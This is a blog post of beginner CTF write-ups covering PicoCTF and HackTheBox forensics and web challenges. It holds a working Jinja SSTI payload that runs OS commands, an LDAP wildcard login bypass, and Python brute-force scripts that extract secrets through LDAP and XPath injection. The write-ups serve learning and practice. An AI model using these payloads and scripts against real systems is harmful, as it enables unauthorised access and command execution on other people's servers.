---
title: CTF Writeups
image: /images/ctf1/capture-the-flag.jpg
tag: 
- CTF
- writeup
---

Why am I doing this: I need more practice for jeopardy style CTFs. PicoCTF is the best for practice. [play along](https://play.picoctf.org). Some challenges are from HTB challenges and some are from the HTB cyber apocalypse which I participated in.

FYI: I will only write about the challenges where I learned something. (Which will probably be most of them since I suck big time right now)

<!--more-->

<img src="/images/ctf1/capture-the-flag.jpg">

## Challenge 1: Shark on Wire 1

<img src="/images/ctf1/wireshark1.png">

Download the file given in challenge. Open the file using wireshark. 

I learned that you can search for strings inside a capture file using wireshark. Using the standard `cat capture.pcap | grep picoCTF` won't work here. Here is how to search for a string:
1. Click on "Edit" and then on "Find Packet".
2. Next select "packet bytes" and enter the string.
3. Right click on the the udp bytes and select follow stream. You will be presented with the flag.

<img src="/images/ctf1/wireflag.png">

## Challenge 2: Pitter Patter Platter

<img src="/images/ctf1/pitter.png">

So this one took me a few days of because I know about forensics as much as a squirrel knows about quantum mechanics. This challenge required knowledge about slack spaces in files. To understand slack space we need to understand about how the system allocates space to new files. The system allocates space to new files in terms of blocks. So if one block is of 4kb size and ghe new file is of 2kb in size then it will be assigned one block and there will be 2kb slack space left.

Now if you know that when files are deleted, they are not deleted. The space they previously acquired is just declared empty and available for use. Hence this is why slack space is important for forensics because it may contain previously deleted file data. Onto the challenge...

After reading the hints I landed upon a pretty famous tool known as [`Autopsy`](https://www.autopsy.com/). Mainly used for all the forensic activities but I just used a small part of it. 

1. First download the given image file and then mount it.
2. To mount, create a directory inside the "tmp" directory and then mount the image using `sudo mount suspicious.dd.sda1 /tmp/picoCTF`
3. Looking around the image we find a file named "Suspicious.txt" which has no useful content.
4. Fire up autopsy and load the image inside it. Click on "Analyze" and then "Search keyword". I looked for the content which I saw inside the suspicious file and found the flag.

<img src="/images/ctf1/autopsy.png" width="1000">

5. Now just enter the flag by reversing it or make a small python script.

## Challenge 3: Em Dee 5

This challenge comes from HTB challenges. This was just an easy challenge in which the challenge showed a string and we had to quickly send the md5 sum. Easy enough. Here is the script I wrote to solve that challenge.

{%highlight python%}
import hashlib
import requests
from bs4 import BeautifulSoup

s=requests.Session()
r=s.get("http://138.68.182.108:31630/")

data=r.text
soup=BeautifulSoup(data,"html.parser")
#print(soup.h3.text)
emdsum=hashlib.md5(soup.h3.text.encode('utf-8')).hexdigest()
#print(emdsum)
txt=s.post("http://138.68.182.108:31630/",data={"hash":emdsum})
print(txt.text)

{%endhighlight%}

## Challenge 4: Templated

Another one from HTB challenges.

<img src="/images/ctf1/template.png">

Powered by Jinja/Flask huh? Browsing to non existing pages reflects their name in the response. Whenever I see something like this server whcih can make use of templates its always a good idea to check for SSTI (server side template injection).

<img src="/images/ctf1/template2.png">

Great! now all we need is a payload to read the flag file. After some googling I came up with the payload:

`request.application.__globals__.__builtins__.__import__('os').popen('id').read()`

<img src="/images/ctf1/template3.png">

Now I just changed the command to read the flag.

## Challenge 5: Phonebook

This one took me a while to figure out since I knew nothing about LDAP injection. I tried various injections on the login screen.

<img src="/images/ctf1/phone1.png" height="500">

Finally I just started fuzzing it with special characters and saw that the "\" char gave me internal error. I looked up and found that this is a reserved character in LDAP. After that I tried other methods to bypass the login. I found that "\*" is also reserved and can be used to bypass the login if the input is not sanitized. I already had a username "reese" from the login screen and I entered "\*" as the password and BOOM I logged in.

<img src="/images/ctf1/phone2.png">

But I didnt get any type of injection in this search functionality. Took me a while to go back to the login screen and try something else. I knew I needed the password. The flag was probably the password. 

I found that we can use regex in LDAP injection using the "\*" char again like: "HTB{\*". Now all I need was a script to brute force with different chars and try them at login. If I get logged in I add that char to the flag. Here is what I wrote:

{%highlight python%}
import requests

chars=[]

for x in range(33,126):
	chars.append(chr(x))
#print(chars)
chars.remove("(")
chars.remove(")")
chars.remove("*")
chars.remove("\\")

username="reese"
flag='HTB{'
length="2586"
while("}"!=flag[-1]):
	for x in chars:
		password=flag+x+"*"
		data={"username":username,"password":password}
		r=requests.post("http://46.101.53.249:31851/login",data=data)
		#print(x,r.headers.get('Content-Length'))
		if (r.headers.get('Content-Length')==length):
			flag+=x
			print(flag)
print(flag)
{%endhighlight%}

I basically created a list of alphanumericals and removed the reserved chars from the list. After that, i just had to run the script and get the flag.

## Challenge 6: E-Tree

This challenge comes from the Cyber apocalypse CTF. Another web-scripting challenge. I dont have the screenshots but I can explain the challenge. So What this challenge had was a search functionality.

We can search a xml file using that query. The xml file had the flag hidden inside it(got the clue from downloadable part of challenge). The server was a flask server and had debug mode ON. So basically triggering any error gave me the full code I need tot develop the exploit. 

{%highlight python%}
@app.route("/api/search", methods=["POST"])

def search():
    name = request.json.get("search", "")
    query = "/military/district/staff[name='{}']".format(name)
    if tree.xpath(query):
        return {"success": 1, "message": "This millitary staff member exists."}
    return {"failure": 1, "message": "This millitary staff member doesn't exist."}
app.run("0.0.0.0", port=1337, debug=True)
{%endhighlight%}


Further googling told me that I need to perform an X path injection. This is basically like sql injection and has "or 1=1" , "and" we can use. I googled even more to find two function of my use: "contains" and "starts-with". As the name suggests we can use these filters to find the flag.

[Here is where I read them from](https://docs.microsoft.com/en-us/previous-versions/troubleshoot/msxml/use-starts-with-xpath-function).

After some more testing I found that the server gives me answer as a yes/no. So I needed a script again. I just used the above script with some improvements and modifications. And here is the payload I created to find the flag.

`'] or /military/district/staff/selfDestructCode[starts-with(.,'CHTB{"+x+"')] or /military/district/staff[name='Baic`

"x" is the chars I will replace it with. The flag was divided in two places in the xml file SO I had to make some modifications after getting the first half of the flag. I know I should automate stuff more but I was on the clock and needed a quick and dirty flag.

{%highlight python%}
import requests
import string

flag='CHTB{'
secflag='4'
length="72"
while("}"!=flag[-1]):
	for x in string.ascii_letters + string.digits + "!@#$%^()@_{}":
		data={"search":"'] or /military/district/staff/selfDestructCode[starts-with(.,'"+secflag+x+"')] or /military/district/staff[name='Baic"}
		#if x == 'C':
		#	continue
		#data={"search":"'] or /military/district/staff/selfDestructCode[starts-with(.,'"+secflag+x+"')] and /military/district/staff/selfDestructCode[contains(.,'}')] or /military/district/staff[name='Baic"}
		r=requests.post("http://138.68.177.159:32689/api/search",json=data)
		#print(x,r.headers.get('Content-Length'))
		if (r.headers.get('Content-Length')==length):
			secflag+=x
			print(secflag)
print(secflag)

{%endhighlight%}


This was all I can jam into one blog. Will write more as I encounter more interesting challenges.